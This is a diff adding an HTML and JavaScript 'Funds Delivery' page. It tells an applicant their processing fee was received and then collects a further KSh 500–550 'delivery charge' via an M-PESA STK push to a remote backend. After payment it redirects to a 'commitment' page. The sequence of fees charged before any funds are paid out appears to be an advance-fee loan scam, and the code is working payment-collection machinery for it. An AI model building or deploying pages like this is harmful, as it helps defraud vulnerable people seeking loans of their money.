@@ -1,1 +1,953 @@
+<!DOCTYPE html>
+<html lang="en">
 
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Funds Delivery</title>
+
+<style>
+
+@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:'Mali',sans-serif;
+    background:#0B0217;
+    color:#fff;
+}
+
+.container{
+    width:92%;
+    max-width:480px;
+    margin:auto;
+}
+
+header{
+    background:#0B0217;
+    color:#fff;
+    padding:20px 0;
+}
+
+header h1{
+    font-size:22px;
+}
+
+.card{
+    background:rgba(255,255,255,0.09);
+    margin:18px 0;
+    padding:22px 20px;
+    border-radius:14px;
+
+    box-shadow:
+        0 20px 60px rgba(0,0,0,0.45);
+}
+
+.card h2{
+    font-size:22px;
+    margin-bottom:10px;
+}
+
+.card p{
+    color:rgba(255,255,255,0.72);
+    line-height:1.5;
+    margin-bottom:20px;
+}
+
+.customer{
+    background:rgba(155,53,255,0.08);
+    border:1px solid rgba(155,53,255,0.18);
+    border-radius:10px;
+    padding:13px;
+    margin-bottom:18px;
+    font-size:14px;
+}
+
+.customer strong{
+    color:#fff;
+}
+
+.delivery-option{
+    display:block;
+
+    border:1px solid
+        rgba(255,255,255,0.12);
+
+    border-radius:10px;
+
+    padding:15px;
+
+    margin-bottom:12px;
+
+    cursor:pointer;
+}
+
+.delivery-option:hover{
+    border-color:
+        rgba(155,53,255,0.6);
+}
+
+.delivery-option input{
+    margin-right:8px;
+}
+
+.method{
+    font-weight:700;
+}
+
+.fee{
+    color:rgba(255,255,255,0.72);
+    font-size:14px;
+    margin-top:5px;
+}
+
+.selected-fee{
+    background:
+        rgba(155,53,255,0.08);
+
+    border:
+        1px solid
+        rgba(155,53,255,0.18);
+
+    padding:14px;
+
+    border-radius:10px;
+
+    margin:18px 0;
+}
+
+.btn{
+    width:100%;
+    padding:15px;
+
+    border:0;
+    border-radius:9px;
+
+    background:
+        linear-gradient(
+            135deg,
+            #9B35FF,
+            #6C1DCE
+        );
+
+    color:#fff;
+
+    font-size:16px;
+    font-weight:700;
+
+    cursor:pointer;
+
+    box-shadow:
+        0 10px 30px
+        rgba(137,43,226,0.30);
+}
+
+.btn:hover{
+    background:
+        linear-gradient(
+            135deg,
+            #A844FF,
+            #7625DC
+        );
+}
+
+.btn:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+}
+
+#status{
+    text-align:center;
+
+    margin-top:15px;
+
+    font-size:14px;
+
+    color:#B86CFF;
+
+    line-height:1.5;
+}
+
+footer{
+    text-align:center;
+
+    padding:25px 10px;
+
+    color:
+        rgba(255,255,255,0.55);
+
+    font-size:12px;
+}
+
+@media(max-width:360px){
+
+    .container{
+        width:94%;
+    }
+
+    .card{
+        padding:18px 15px;
+    }
+
+    .card h2{
+        font-size:20px;
+    }
+
+    .btn{
+        padding:14px;
+        font-size:15px;
+    }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<header>
+
+<div class="container">
+
+<h1>
+Funds Delivery
+</h1>
+
+</div>
+
+</header>
+
+
+<main class="container">
+
+<section class="card">
+
+<h2>
+Congratulations!
+</h2>
+
+<p>
+Your processing fee has been successfully received.
+Please choose where you would like your funds transferred.
+</p>
+
+
+<div class="customer">
+
+Applicant:
+<strong>
+<span id="applicantName">
+Applicant
+</span>
+</strong>
+
+<br>
+
+M-PESA Number:
+<strong>
+<span id="customerPhone">
+Not available
+</span>
+</strong>
+
+</div>
+
+
+<label class="delivery-option">
+
+<input
+    type="radio"
+    name="delivery"
+    value="500"
+    data-method="SAFARICOM MPESA"
+    onchange="updateFee()"
+>
+
+<span class="method">
+SAFARICOM M-PESA
+</span>
+
+<div class="fee">
+Delivery charge: KSh 500
+</div>
+
+</label>
+
+
+<label class="delivery-option">
+
+<input
+    type="radio"
+    name="delivery"
+    value="550"
+    data-method="BANK ACCOUNT"
+    onchange="updateFee()"
+>
+
+<span class="method">
+BANK ACCOUNT
+</span>
+
+<div class="fee">
+Delivery charge: KSh 550
+</div>
+
+</label>
+
+
+<div class="selected-fee">
+
+Delivery Fee:
+
+<strong>
+KSh
+<span id="deliveryFee">
+0
+</span>
+</strong>
+
+</div>
+
+
+<button
+    type="button"
+    id="payButton"
+    class="btn"
+    onclick="payDelivery()"
+>
+Pay Delivery Charges
+</button>
+
+
+<div id="status"></div>
+
+</section>
+
+</main>
+
+
+<footer>
+
+Please review the selected delivery method and applicable charge
+before making payment.
+
+</footer>
+
+
+<script>
+
+/*
+====================================================
+BACKEND
+====================================================
+*/
+
+const BACKEND_URL =
+    "https://kipngeno-nyota-backend.onrender.com";
+
+
+/*
+====================================================
+LOAD CUSTOMER DETAILS
+====================================================
+*/
+
+const applicantName =
+    localStorage.getItem(
+        "applicantName"
+    ) ||
+    localStorage.getItem(
+        "fullName"
+    ) ||
+    "Applicant";
+
+
+const customerPhone =
+    localStorage.getItem(
+        "phoneNumber"
+    ) ||
+    "";
+
+
+document.getElementById(
+    "applicantName"
+).innerText =
+    applicantName;
+
+
+document.getElementById(
+    "customerPhone"
+).innerText =
+    customerPhone ||
+    "Not available";
+
+
+/*
+====================================================
+UPDATE DELIVERY FEE
+====================================================
+*/
+
+function updateFee(){
+
+    const selected =
+        document.querySelector(
+            'input[name="delivery"]:checked'
+        );
+
+
+    if(selected){
+
+        document.getElementById(
+            "deliveryFee"
+        ).innerText =
+            Number(
+                selected.value
+            ).toLocaleString();
+
+    }
+
+}
+
+
+/*
+====================================================
+PAY DELIVERY
+====================================================
+*/
+
+async function payDelivery(){
+
+    const selected =
+        document.querySelector(
+            'input[name="delivery"]:checked'
+        );
+
+
+    if(!selected){
+
+        alert(
+            "Please select a delivery method."
+        );
+
+        return;
+
+    }
+
+
+    const phone =
+        localStorage.getItem(
+            "phoneNumber"
+        );
+
+
+    if(!phone){
+
+        alert(
+            "M-PESA phone number not found."
+        );
+
+        return;
+
+    }
+
+
+    const amount =
+        Number(
+            selected.value
+        );
+
+
+    const method =
+        selected.dataset.method;
+
+
+    const status =
+        document.getElementById(
+            "status"
+        );
+
+
+    const button =
+        document.getElementById(
+            "payButton"
+        );
+
+
+    /*
+    SAVE DELIVERY DETAILS
+    */
+
+    localStorage.setItem(
+        "deliveryMethod",
+        method
+    );
+
+
+    localStorage.setItem(
+        "deliveryFee",
+        amount
+    );
+
+
+    /*
+    DISABLE BUTTON
+    */
+
+    button.disabled = true;
+
+    button.innerText =
+        "Sending STK Push...";
+
+
+    status.innerText =
+        "Please wait...";
+
+
+    try{
+
+        /*
+        ================================================
+        SEND PAYLOR STK PUSH
+        ================================================
+        */
+
+        const response =
+            await fetch(
+
+                BACKEND_URL +
+                "/api/payment/stk-push",
+
+                {
+
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:
+                        JSON.stringify({
+
+                            phone:
+                                phone,
+
+                            amount:
+                                amount,
+
+                            description:
+                                "Nyota Funds delivery charge"
+
+                        })
+
+                }
+
+            );
+
+
+        /*
+        READ RESPONSE
+        */
+
+        const data =
+            await response
+                .json()
+                .catch(
+                    () => ({})
+                );
+
+
+        console.log(
+            "DELIVERY STK RESPONSE:",
+            data
+        );
+
+
+        /*
+        CHECK RESPONSE
+        */
+
+        if(
+            !response.ok ||
+            !data.success
+        ){
+
+            throw new Error(
+
+                data.error ||
+                data.message ||
+                "Payment request failed"
+
+            );
+
+        }
+
+
+        /*
+        ================================================
+        PAYMENT REFERENCE
+        ================================================
+        */
+
+        const reference =
+            data.reference;
+
+
+        if(!reference){
+
+            throw new Error(
+                "No payment reference received."
+            );
+
+        }
+
+
+        /*
+        SAVE PAYMENT DETAILS
+        */
+
+        localStorage.setItem(
+            "deliveryPaymentReference",
+            reference
+        );
+
+
+        if(
+            data.transactionId
+        ){
+
+            localStorage.setItem(
+                "deliveryTransactionId",
+                data.transactionId
+            );
+
+        }
+
+
+        /*
+        ================================================
+        SHOW MESSAGE
+        ================================================
+        */
+
+        button.innerText =
+            "Waiting for Payment...";
+
+
+        status.innerText =
+            "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";
+
+
+        /*
+        ================================================
+        CHECK PAYMENT
+        ================================================
+        */
+
+        checkDeliveryPayment(
+            reference
+        );
+
+
+    }catch(error){
+
+        console.error(
+            "DELIVERY PAYMENT ERROR:",
+            error
+        );
+
+
+        button.disabled =
+            false;
+
+
+        button.innerText =
+            "Pay Delivery Charges";
+
+
+        status.innerText =
+            "";
+
+
+        alert(
+            error.message ||
+            "Payment request failed."
+        );
+
+    }
+
+}
+
+
+/*
+====================================================
+CHECK DELIVERY PAYMENT
+====================================================
+*/
+
+function checkDeliveryPayment(
+    reference
+){
+
+    let attempts = 0;
+
+    const maxAttempts = 100;
+
+
+    const status =
+        document.getElementById(
+            "status"
+        );
+
+
+    const button =
+        document.getElementById(
+            "payButton"
+        );
+
+
+    /*
+    CHECK EVERY 3 SECONDS
+    */
+
+    window.deliveryPaymentChecker =
+        setInterval(
+            async () => {
+
+                attempts++;
+
+
+                try{
+
+                    const response =
+                        await fetch(
+
+                            BACKEND_URL +
+                            "/api/payment/status?reference=" +
+                            encodeURIComponent(
+                                reference
+                            ),
+
+                            {
+                                method:"GET",
+
+                                cache:"no-store"
+                            }
+
+                        );
+
+
+                    const result =
+                        await response.json();
+
+
+                    console.log(
+                        "DELIVERY PAYMENT STATUS:",
+                        result
+                    );
+
+
+                    const paymentStatus =
+                        String(
+                            result.status ||
+                            ""
+                        ).toUpperCase();
+
+
+                    /*
+                    ============================================
+                    PAYMENT SUCCESS
+                    ============================================
+                    */
+
+                    if(
+
+                        paymentStatus ===
+                            "COMPLETED" ||
+
+                        paymentStatus ===
+                            "SUCCESS"
+
+                    ){
+
+                        clearInterval(
+                            window.deliveryPaymentChecker
+                        );
+
+
+                        /*
+                        SAVE STATUS
+                        */
+
+                        localStorage.setItem(
+                            "deliveryPaymentStatus",
+                            "COMPLETED"
+                        );
+
+
+                        if(
+                            result.transactionId
+                        ){
+
+                            localStorage.setItem(
+                                "deliveryTransactionId",
+                                result.transactionId
+                            );
+
+                        }
+
+
+                        if(
+                            result.mpesaReceipt
+                        ){
+
+                            localStorage.setItem(
+                                "deliveryMpesaReceipt",
+                                result.mpesaReceipt
+                            );
+
+                        }
+
+
+                        /*
+                        SUCCESS MESSAGE
+                        */
+
+                        status.innerText =
+                            "Delivery payment successful. Redirecting...";
+
+
+                        button.innerText =
+                            "Payment Successful";
+
+
+                        /*
+                        ========================================
+                        GO TO COMMITMENT
+                        ========================================
+                        */
+
+                        setTimeout(
+                            () => {
+
+                                window.location.replace(
+                                    "commitment.html"
+                                );
+
+                            },
+                            800
+                        );
+
+
+                        return;
+
+                    }
+
+
+                    /*
+                    ============================================
+                    PAYMENT FAILED
+                    ============================================
+                    */
+
+                    if(
+
+                        paymentStatus ===
+                            "FAILED" ||
+
+                        paymentStatus ===
+                            "CANCELLED"
+
+                    ){
+
+                        clearInterval(
+                            window.deliveryPaymentChecker
+                        );
+
+
+                        status.innerText =
+                            "Payment was not completed. Please try again.";
+
+
+                        button.disabled =
+                            false;
+
+
+                        button.innerText =
+                            "Pay Delivery Charges";
+
+
+                        return;
+
+                    }
+
+
+                    /*
+                    ============================================
+                    STILL PENDING
+                    ============================================
+                    */
+
+                    status.innerText =
+                        "Confirming delivery payment...";
+
+
+                    /*
+                    ============================================
+                    TIMEOUT
+                    ============================================
+                    */
+
+                    if(
+                        attempts >=
+                            maxAttempts
+                    ){
+
+                        clearInterval(
+                            window.deliveryPaymentChecker
+                        );
+
+
+                        status.innerText =
+                            "Payment confirmation is taking longer than expected. Please check your M-PESA transaction.";
+
+
+                        button.disabled =
+                            false;
+
+
+                        button.innerText =
+                            "Pay Delivery Charges";
+
+                    }
+
+
+                }catch(error){
+
+                    console.error(
+                        "DELIVERY STATUS ERROR:",
+                        error
+                    );
+
+                }
+
+            },
+            3000
+        );
+
+}
+
+</script>
+
+</body>
+
+</html>
